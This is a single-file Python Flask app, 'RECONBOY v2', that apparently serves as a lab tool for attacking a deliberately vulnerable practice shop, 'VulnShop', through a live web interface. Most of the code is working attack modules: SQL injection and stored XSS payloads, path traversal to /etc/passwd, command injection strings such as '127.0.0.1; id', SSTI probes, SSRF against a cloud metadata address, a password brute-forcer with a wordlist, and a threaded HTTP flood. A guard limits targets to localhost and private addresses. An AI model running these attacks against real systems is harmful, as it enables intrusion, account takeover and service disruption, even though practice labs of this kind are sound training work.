#!/usr/bin/env python3
"""
RECONBOY v2 — Local Network Attack Lab (Web UI)
Retargeted to attack VulnShop's exact endpoints.
Single-file Flask app. Type a target, pick intensity, hit Attack,
watch results stream live.

SAFETY: Refuses to run against anything that isn't localhost or a
private/local-network address (RFC1918 / loopback).

Run:
  pip install flask requests --break-system-packages
  python3 reconboy.py
  open http://127.0.0.1:9090
"""
import re, os, time, hashlib, threading, urllib.parse, socket, ipaddress
import uuid
from datetime import datetime

try:
    import requests
    from flask import Flask, request, jsonify, Response
except ImportError:
    print("Missing deps. Run: pip install flask requests --break-system-packages")
    raise SystemExit(1)

app = Flask(__name__)

SCAN_LOCK = threading.Lock()
SCAN_STATE = {
    "running": False, "target": None, "intensity": None,
    "log": [], "findings": [], "results": [],
    "start_time": None, "stop_event": None, "scan_id": None,
}

# ── Safety guard ─────────────────────────────────────────────────
def is_local_target(url):
    try:
        host = urllib.parse.urlparse(url).hostname
        if not host:
            return False
        if host in ('localhost', '127.0.0.1', '::1'):
            return True
        ip = socket.gethostbyname(host)
        addr = ipaddress.ip_address(ip)
        return addr.is_private or addr.is_loopback
    except Exception:
        return False

INTENSITY_CONFIG = {
    1: {'name': 'QUICK', 'timeout': 2, 'delay': 0.05},
    2: {'name': 'STANDARD', 'timeout': 4, 'delay': 0.1},
    3: {'name': 'DEEP', 'timeout': 8, 'delay': 0.05},
}

# ── Logging helpers ─────────────────────────────────────────────
def log(kind, text):
    SCAN_STATE["log"].append({"type": kind, "text": text,
                               "ts": datetime.now().strftime('%H:%M:%S')})

def hdr(n, total, name, cat):
    elapsed = time.time() - SCAN_STATE["start_time"] if SCAN_STATE["start_time"] else 0
    log("header", f"[{n:02d}/{total}] {name}  [{cat}]  ({elapsed:.1f}s)")

def ok(m):   log("hit", m)
def warn(m): log("partial", m)
def info(m): log("info", m)
def skip(m): log("skip", m)
def err(m):  log("error", m)

def record(n, name, cat, status, detail, severity='LOW'):
    SCAN_STATE["results"].append({'num': n, 'name': name, 'category': cat,
                                   'status': status, 'detail': detail, 'severity': severity})
    if status == 'CONFIRMED':
        SCAN_STATE["findings"].append({'name': name, 'category': cat,
                                        'severity': severity, 'detail': detail})

def req(method, url, intensity, **kw):
    cfg = INTENSITY_CONFIG[intensity]
    kw.setdefault('timeout', cfg['timeout'])
    kw.setdefault('allow_redirects', True)
    if SCAN_STATE["stop_event"] and SCAN_STATE["stop_event"].is_set():
        return None
    try:
        return getattr(requests, method)(url, **kw)
    except requests.exceptions.RequestException:
        return None

def check_target(target, intensity):
    log("info", f"Checking target {target}...")
    r = req('get', target, intensity)
    if r and r.status_code < 500:
        log("info", f"Target UP — HTTP {r.status_code}")
        return True
    log("error", "Target unreachable!")
    return False

# ── Payloads matched to VulnShop ────────────────────────────────
SQLI_LOGIN_PAYLOADS = ["admin' --", "admin' #", "' OR '1'='1' --", "' OR 1=1 --", "admin'-- -"]
SQLI_SEARCH_PAYLOADS = ["x' OR '1'='1", "' OR '1'='1' --", "z' UNION SELECT 1,2,3,4 --"]
XSS_PAYLOADS = [
    "<script>alert(document.cookie)</script>", "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
]
TRAVERSAL_PAYLOADS = ["secret_do_not_serve.txt", "../secret_do_not_serve.txt",
                       "../../../../etc/passwd", "../../../../../../etc/passwd"]
CMDI_PAYLOADS = ["127.0.0.1; id", "127.0.0.1 && id", "127.0.0.1 | id",
                 "127.0.0.1; whoami", "127.0.0.1; uname -a"]
SSTI_PAYLOADS = [("{{7*7}}", "49"), ("{{7*'7'}}", "7777777")]
PASSWORDS = {1: ["admin", "password", "S3cr3tAdmin!"],
             2: ["admin", "password", "123456", "letmein", "S3cr3tAdmin!", "password123", "toor"],
             3: ["admin", "password", "123456", "letmein", "S3cr3tAdmin!", "password123", "toor",
                 "welcome", "qwerty", "admin123", "root", "changeme", "test123"]}

def get_limited(lst, intensity):
    limits = {1: 3, 2: len(lst), 3: len(lst)}
    return lst[:limits[intensity]]

# ── ATTACK FUNCTIONS (mapped 1:1 to VulnShop endpoints) ─────────

def a01_sqli_login(n, total, T, I):
    hdr(n, total, "SQL Injection — Login Bypass", "SQL INJECTION")
    for pl in get_limited(SQLI_LOGIN_PAYLOADS, I):
        if SCAN_STATE["stop_event"].is_set(): break
        r = req('post', f"{T}/login", I, data={"username": pl, "password": "x"})
        if r and ('Welcome' in r.text or 'Login successful' in r.text):
            ok(f"SQLi login bypass CONFIRMED! payload={pl!r} (POST /login)")
            record(n, "SQLi Login Bypass", "SQL_INJECTION", "CONFIRMED", pl, 'CRITICAL')
            return
    warn("SQLi login payloads delivered — no confirmed bypass")
    record(n, "SQLi Login Bypass", "SQL_INJECTION", "TESTED", "payloads sent")

def a02_sqli_search(n, total, T, I):
    hdr(n, total, "SQL Injection — Product Search", "SQL INJECTION")
    for pl in get_limited(SQLI_SEARCH_PAYLOADS, I):
        if SCAN_STATE["stop_event"].is_set(): break
        r = req('get', f"{T}/", I, params={"q": pl})
        if r and r.status_code == 200 and 'card' in r.text:
            ok(f"SQLi search query executed without error — payload={pl!r} (GET /?q=)")
            record(n, "SQLi Search", "SQL_INJECTION", "CONFIRMED", pl, 'HIGH')
            return
    warn("SQLi search payloads delivered")
    record(n, "SQLi Search", "SQL_INJECTION", "TESTED", "payloads sent")

def a03_xss_stored(n, total, T, I):
    hdr(n, total, "Stored XSS — Product Review", "XSS")
    for pl in get_limited(XSS_PAYLOADS, I):
        if SCAN_STATE["stop_event"].is_set(): break
        req('post', f"{T}/product/1", I, data={"review": pl})
        r2 = req('get', f"{T}/product/1", I)
        if r2 and pl in r2.text:
            ok(f"Stored XSS CONFIRMED! payload={pl!r} (POST /product/1)")
            record(n, "Stored XSS", "XSS", "CONFIRMED", pl, 'CRITICAL')
            return
    warn("Stored XSS payloads delivered")
    record(n, "Stored XSS", "XSS", "TESTED", "payloads sent")

def a04_idor(n, total, T, I):
    hdr(n, total, "IDOR — Order Access", "IDOR")
    hits = []
    for oid in [1, 2, 3, 4, 5]:
        if SCAN_STATE["stop_event"].is_set(): break
        r = req('get', f"{T}/order/{oid}", I)
        if r and r.status_code == 200 and 'Order #' in r.text:
            m = re.search(r'Customer: <b>([^<]+)</b>', r.text)
            cust = m.group(1) if m else '?'
            info(f"/order/{oid} accessible — customer: {cust}")
            hits.append(oid)
    if len(hits) >= 2:
        ok(f"IDOR CONFIRMED — accessed {len(hits)} orders without ownership check: {hits}")
        record(n, "IDOR", "IDOR", "CONFIRMED", f"orders={hits}", 'HIGH')
    else:
        warn("Order enumeration attempted")
        record(n, "IDOR", "IDOR", "TESTED", f"orders checked={hits}")

def a05_traversal(n, total, T, I):
    hdr(n, total, "Path Traversal — File Download", "DIR TRAVERSAL")
    for pl in get_limited(TRAVERSAL_PAYLOADS, I):
        if SCAN_STATE["stop_event"].is_set(): break
        r = req('get', f"{T}/download", I, params={"file": pl})
        if r and ('FLAG{' in r.text or 'root:' in r.text or '[boot loader]' in r.text):
            ok(f"Path traversal CONFIRMED! file={pl!r} (GET /download)")
            record(n, "Path Traversal", "DIR_TRAVERSAL", "CONFIRMED", pl, 'CRITICAL')
            return
    warn("Traversal payloads delivered")
    record(n, "Path Traversal", "DIR_TRAVERSAL", "TESTED", "payloads sent")

def a06_cmdi(n, total, T, I):
    hdr(n, total, "Command Injection — Ping Tool", "CMD INJECTION")
    for pl in get_limited(CMDI_PAYLOADS, I):
        if SCAN_STATE["stop_event"].is_set(): break
        r = req('post', f"{T}/ping", I, data={"host": pl})
        if r and any(x in r.text for x in ['uid=', 'root', 'Linux', 'gid=']):
            ok(f"Command injection CONFIRMED! payload={pl!r} (POST /ping)")
            record(n, "Command Injection", "CMD_INJECTION", "CONFIRMED", pl, 'CRITICAL')
            return
    warn("CMDi payloads delivered")
    record(n, "Command Injection", "CMD_INJECTION", "TESTED", "payloads sent")

def a07_ssti(n, total, T, I):
    hdr(n, total, "SSTI — Profile Bio (authenticated)", "SSTI")
    s = requests.Session()
    try:
        s.post(f"{T}/login", data={"username": "admin", "password": "S3cr3tAdmin!"}, timeout=5)
        for probe, expected in SSTI_PAYLOADS:
            if SCAN_STATE["stop_event"].is_set(): break
            r = s.post(f"{T}/profile", data={"bio": probe}, timeout=5)
            if r and expected in r.text:
                ok(f"SSTI CONFIRMED! {probe} -> {expected} (POST /profile, session req'd)")
                record(n, "SSTI", "SSTI", "CONFIRMED", f"{probe}->{expected}", 'CRITICAL')
                return
        warn("SSTI probes delivered — no confirmed injection")
        record(n, "SSTI", "SSTI", "TESTED", "probes sent")
    except requests.exceptions.RequestException as e:
        warn(f"Session/login failed: {e}")
        record(n, "SSTI", "SSTI", "TESTED", "login failed")

def a08_broken_access(n, total, T, I):
    hdr(n, total, "Broken Access Control — Admin Panel", "ACCESS CONTROL")
    r = req('get', f"{T}/admin", I, params={"role": "admin"})
    if r and 'Access granted' in r.text:
        secrets = re.findall(r'FLAG\{[^}]+\}', r.text)
        ok(f"Broken access control CONFIRMED — admin panel reached via ?role=admin"
           + (f", leaked: {secrets}" if secrets else ""))
        record(n, "Broken Access Control", "ACCESS_CONTROL", "CONFIRMED",
               f"?role=admin, secrets={secrets}", 'CRITICAL')
    else:
        warn("Admin panel access attempt sent")
        record(n, "Broken Access Control", "ACCESS_CONTROL", "TESTED", "")

def a09_csrf(n, total, T, I):
    hdr(n, total, "CSRF — State Change via GET", "CSRF")
    r = req('get', f"{T}/transfer", I, params={"to": "attacker", "amount": "9999"})
    if r and 'Transfer Complete' in r.text:
        ok("CSRF CONFIRMED — state-changing GET request accepted, no token required")
        record(n, "CSRF", "CSRF", "CONFIRMED", "to=attacker&amount=9999", 'HIGH')
    else:
        warn("CSRF request sent")
        record(n, "CSRF", "CSRF", "TESTED", "")

def a10_weak_reset(n, total, T, I):
    hdr(n, total, "Weak Password Reset Token", "AUTH BYPASS")
    r = req('post', f"{T}/reset", I, data={"username": "admin"})
    if r and 'Reset token' in r.text:
        m = re.search(r'<code>([a-f0-9]{32})</code>', r.text)
        token = m.group(1) if m else '?'
        expected = hashlib.md5(b"adminvulnshop_secret").hexdigest()
        if token == expected:
            ok(f"Weak reset token CONFIRMED predictable — md5(username+static_secret) = {token}")
            record(n, "Weak Reset Token", "AUTH_BYPASS", "CONFIRMED", f"token={token}", 'HIGH')
        else:
            info(f"Token received: {token}")
            record(n, "Weak Reset Token", "AUTH_BYPASS", "TESTED", token)
    else:
        warn("Reset request sent")
        record(n, "Weak Reset Token", "AUTH_BYPASS", "TESTED", "")

def a11_ssrf(n, total, T, I):
    hdr(n, total, "SSRF — Fetch Avatar", "SSRF")
    for internal_url in [f"{T}/admin?role=admin", "http://127.0.0.1:5000/admin",
                          "http://169.254.169.254/latest/meta-data/"]:
        if SCAN_STATE["stop_event"].is_set(): break
        r = req('post', f"{T}/fetch-avatar", I, data={"url": internal_url})
        if r and 'internal/localhost address' in r.text:
            ok(f"SSRF CONFIRMED — server would fetch internal resource: {internal_url}")
            record(n, "SSRF", "SSRF", "CONFIRMED", internal_url, 'HIGH')
            return
    warn("SSRF probes delivered")
    record(n, "SSRF", "SSRF", "TESTED", "probes sent")

def a12_bruteforce(n, total, T, I):
    hdr(n, total, "Brute Force — Login", "BRUTE FORCE")
    if I == 1:
        skip("Skipped in Quick mode")
        record(n, "Brute Force", "BRUTE_FORCE", "SKIPPED", "")
        return
    passwords = PASSWORDS[I]
    for uname in ['admin', 'alice', 'bob']:
        for pw in passwords:
            if SCAN_STATE["stop_event"].is_set(): break
            r = req('post', f"{T}/login", I, data={"username": uname, "password": pw})
            if r and 'Login successful' in r.text:
                ok(f"Credentials FOUND: {uname}:{pw}")
                record(n, "Brute Force", "BRUTE_FORCE", "CONFIRMED", f"{uname}:{pw}", 'HIGH')
                return
            time.sleep(INTENSITY_CONFIG[I]['delay'])
    warn(f"No credentials found")
    record(n, "Brute Force", "BRUTE_FORCE", "TESTED", f"{len(passwords)*3} tried")

def a13_dos(n, total, T, I):
    hdr(n, total, "DoS — HTTP Request Flood", "DOS")
    if I == 1:
        skip("Skipped in Quick mode")
        record(n, "DoS Flood", "DOS", "SKIPPED", "")
        return
    threads_count = {2: 8, 3: 15}[I]
    reqs_each = {2: 10, 3: 20}[I]
    info(f"{threads_count} threads x {reqs_each} requests")
    counter = {'sent': 0}
    lock = threading.Lock()

    def flood():
        for _ in range(reqs_each):
            r = req('get', f"{T}/", I, params={"q": "dos"})
            with lock:
                if r: counter['sent'] += 1

    t0 = time.time()
    ts = [threading.Thread(target=flood) for _ in range(threads_count)]
    for t in ts: t.start()
    for t in ts: t.join()
    el = time.time() - t0
    rps = counter['sent'] / el if el > 0 else 0
    ok(f"Flood: {counter['sent']}/{threads_count*reqs_each} in {el:.2f}s ({rps:.0f} rps)")
    record(n, "DoS Flood", "DOS", "CONFIRMED", f"{counter['sent']} reqs", 'MEDIUM')

ALL_ATTACKS = [
    a01_sqli_login, a02_sqli_search, a03_xss_stored, a04_idor,
    a05_traversal, a06_cmdi, a07_ssti, a08_broken_access,
    a09_csrf, a10_weak_reset, a11_ssrf, a12_bruteforce, a13_dos,
]

def run_scan_thread(target, intensity):
    SCAN_STATE["running"] = True
    SCAN_STATE["target"] = target
    SCAN_STATE["intensity"] = intensity
    SCAN_STATE["log"] = []
    SCAN_STATE["findings"] = []
    SCAN_STATE["results"] = []
    SCAN_STATE["start_time"] = time.time()
    SCAN_STATE["stop_event"] = threading.Event()
    SCAN_STATE["scan_id"] = str(uuid.uuid4())[:8]

    log("banner", f"RECONBOY — attacking {target} — intensity {INTENSITY_CONFIG[intensity]['name']}")

    if not check_target(target, intensity):
        log("error", "Aborting — target unreachable")
        SCAN_STATE["running"] = False
        return

    total = len(ALL_ATTACKS)
    for i, fn in enumerate(ALL_ATTACKS, 1):
        if SCAN_STATE["stop_event"].is_set():
            log("info", "Scan stopped by user")
            break
        try:
            fn(i, total, target, intensity)
        except Exception as e:
            err(f"Attack #{i} ({fn.__name__}) crashed: {e}")
            record(i, fn.__name__, "ERROR", "ERROR", str(e))
        time.sleep(INTENSITY_CONFIG[intensity]['delay'])

    elapsed = time.time() - SCAN_STATE["start_time"]
    log("summary", f"DONE — {len(SCAN_STATE['results'])} attacks run, "
                    f"{len(SCAN_STATE['findings'])} confirmed, {elapsed:.1f}s")
    SCAN_STATE["running"] = False

# ── Routes ───────────────────────────────────────────────────────
@app.route('/')
def index():
    return HTML_PAGE

@app.route('/api/attack', methods=['POST'])
def api_attack():
    with SCAN_LOCK:
        if SCAN_STATE["running"]:
            return jsonify({"error": "A scan is already running"}), 409
        data = request.get_json(force=True)
        target = (data.get('target') or '').strip()
        intensity = int(data.get('intensity', 2))
        if intensity not in (1, 2, 3):
            return jsonify({"error": "Invalid intensity"}), 400
        if not target.startswith('http://') and not target.startswith('https://'):
            target = 'http://' + target
        target = target.rstrip('/')
        if not is_local_target(target):
            return jsonify({"error": "Refused: target must be localhost or a private "
                                      "LAN address (10.x, 172.16-31.x, 192.168.x, 127.0.0.1)."}), 400
        t = threading.Thread(target=run_scan_thread, args=(target, intensity), daemon=True)
        t.start()
    return jsonify({"status": "started"})

@app.route('/api/stop', methods=['POST'])
def api_stop():
    if SCAN_STATE["stop_event"]:
        SCAN_STATE["stop_event"].set()
    return jsonify({"status": "stopping"})

@app.route('/api/status')
def api_status():
    return jsonify({
        "running": SCAN_STATE["running"], "target": SCAN_STATE["target"],
        "intensity": SCAN_STATE["intensity"], "log": SCAN_STATE["log"],
        "findings": SCAN_STATE["findings"], "results": SCAN_STATE["results"],
    })

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>RECONBOY — Attack Lab</title>
<style>
  :root {
    --bg: #0b0e14; --panel: #111620; --border: #1f2937;
    --green: #39ff88; --red: #ff4757; --yellow: #ffc857;
    --blue: #58a6ff; --purple: #a970ff; --text: #c9d1d9; --dim: #6b7280;
  }
  * { box-sizing: border-box; }
  body { background: var(--bg); color: var(--text); font-family: 'Consolas','Courier New',monospace; margin:0; padding:24px; }
  h1 { color: var(--green); letter-spacing: 4px; font-size: 28px; margin: 0 0 4px 0; text-shadow: 0 0 12px rgba(57,255,136,0.4); }
  .subtitle { color: var(--dim); font-size: 13px; margin-bottom: 20px; }
  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 18px; margin-bottom: 16px; }
  .controls { display: flex; gap: 12px; flex-wrap: wrap; align-items: end; }
  label { display: block; font-size: 11px; color: var(--dim); margin-bottom: 4px; text-transform: uppercase; }
  input, select { background: #0d1117; border: 1px solid var(--border); color: var(--text); padding: 9px 12px; border-radius: 5px; font-family: inherit; font-size: 13px; }
  input { width: 320px; }
  input:focus, select:focus { outline: none; border-color: var(--green); }
  button { background: var(--green); color: #04120a; border: none; padding: 10px 22px; border-radius: 5px; font-family: inherit; font-weight: bold; cursor: pointer; font-size: 13px; letter-spacing: 1px; }
  button:hover { filter: brightness(1.1); }
  button:disabled { background: var(--dim); cursor: not-allowed; }
  button.stop { background: var(--red); color: #fff; }
  .status-bar { display: flex; gap: 24px; margin-top: 14px; font-size: 12px; color: var(--dim); }
  .status-bar span b { color: var(--text); }
  #log { background: #05070b; border: 1px solid var(--border); border-radius: 6px; padding: 14px; height: 480px; overflow-y: auto; font-size: 12.5px; line-height: 1.6; }
  .l-header { color: var(--yellow); border-top: 1px solid var(--border); padding-top: 6px; margin-top: 6px; }
  .l-hit { color: var(--green); font-weight: bold; }
  .l-partial { color: var(--yellow); }
  .l-info { color: var(--blue); }
  .l-skip { color: var(--dim); }
  .l-error { color: var(--red); }
  .l-banner { color: var(--purple); font-weight: bold; }
  .l-summary { color: var(--green); font-weight: bold; border-top: 1px solid var(--border); padding-top: 8px; margin-top: 8px; }
  .ts { color: var(--dim); margin-right: 8px; }
  #findings { display: flex; flex-direction: column; gap: 6px; }
  .finding { padding: 8px 12px; border-radius: 5px; background: #1a0d0d; border-left: 3px solid var(--red); font-size: 12.5px; }
  .finding.HIGH { border-color: var(--yellow); background: #1a1608; }
  .finding.MEDIUM { border-color: var(--yellow); background: #1a1608; }
  .finding .sev { font-weight: bold; margin-right: 8px; }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 10px; margin-left: 10px; }
  .badge.local { background: #0d2818; color: var(--green); border: 1px solid var(--green); }
  .empty { color: var(--dim); font-style: italic; }
</style>
</head>
<body>
  <h1>&gt; RECONBOY_</h1>
  <div class="subtitle">Retargeted for VulnShop — 13 attack modules — LAN/localhost only <span class="badge local">SAFE SCOPE ENFORCED</span></div>

  <div class="panel">
    <div class="controls">
      <div><label>Target</label><input id="target" placeholder="127.0.0.1:5000 or 192.168.1.x:5000" /></div>
      <div>
        <label>Intensity</label>
        <select id="intensity">
          <option value="1">1 — Quick</option>
          <option value="2" selected>2 — Standard</option>
          <option value="3">3 — Deep</option>
        </select>
      </div>
      <button id="attackBtn" onclick="startAttack()">▶ ATTACK</button>
      <button id="stopBtn" class="stop" onclick="stopAttack()" style="display:none">■ STOP</button>
    </div>
    <div class="status-bar">
      <span>Status: <b id="statusText">idle</b></span>
      <span>Attacks run: <b id="statAttacks">0</b></span>
      <span>Confirmed findings: <b id="statFindings">0</b></span>
    </div>
  </div>

  <div class="panel">
    <label style="margin-bottom:8px;">Live Output</label>
    <div id="log"><div class="empty">Set a target and hit ATTACK to begin...</div></div>
  </div>

  <div class="panel">
    <label style="margin-bottom:8px;">Confirmed Vulnerabilities</label>
    <div id="findings"><div class="empty">No findings yet</div></div>
  </div>

<script>
let polling = null;
function startAttack() {
  const target = document.getElementById('target').value.trim();
  const intensity = parseInt(document.getElementById('intensity').value);
  if (!target) { alert('Enter a target first'); return; }
  fetch('/api/attack', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({target, intensity})})
    .then(r => r.json()).then(data => {
      if (data.error) { alert(data.error); return; }
      document.getElementById('attackBtn').style.display = 'none';
      document.getElementById('stopBtn').style.display = 'inline-block';
      document.getElementById('log').innerHTML = '';
      document.getElementById('findings').innerHTML = '<div class="empty">No findings yet</div>';
      poll();
    }).catch(e => alert('Request failed: ' + e));
}
function stopAttack() { fetch('/api/stop', {method:'POST'}); }
function poll() {
  if (polling) clearInterval(polling);
  polling = setInterval(() => { fetch('/api/status').then(r=>r.json()).then(renderStatus); }, 800);
}
function renderStatus(s) {
  document.getElementById('statusText').textContent = s.running ? 'RUNNING' : 'idle';
  document.getElementById('statAttacks').textContent = s.results.length;
  document.getElementById('statFindings').textContent = s.findings.length;
  const logEl = document.getElementById('log');
  logEl.innerHTML = s.log.map(l => `<div class="l-${l.type}"><span class="ts">${l.ts}</span>${escapeHtml(l.text)}</div>`).join('');
  logEl.scrollTop = logEl.scrollHeight;
  const fEl = document.getElementById('findings');
  fEl.innerHTML = s.findings.length === 0 ? '<div class="empty">No findings yet</div>' :
    s.findings.map(f => `<div class="finding ${f.severity}"><span class="sev">[${f.severity}]</span>${escapeHtml(f.name)} — ${escapeHtml(f.detail)}</div>`).join('');
  if (!s.running) {
    document.getElementById('attackBtn').style.display = 'inline-block';
    document.getElementById('stopBtn').style.display = 'none';
    if (polling) { clearInterval(polling); polling = null; }
  }
}
function escapeHtml(str) { const d = document.createElement('div'); d.textContent = str; return d.innerHTML; }
</script>
</body>
</html>
"""

if __name__ == '__main__':
    print("\n  RECONBOY (VulnShop-targeted) starting...")
    print("  Open: http://127.0.0.1:9090\n")
    app.run(host='127.0.0.1', port=9090, debug=False)
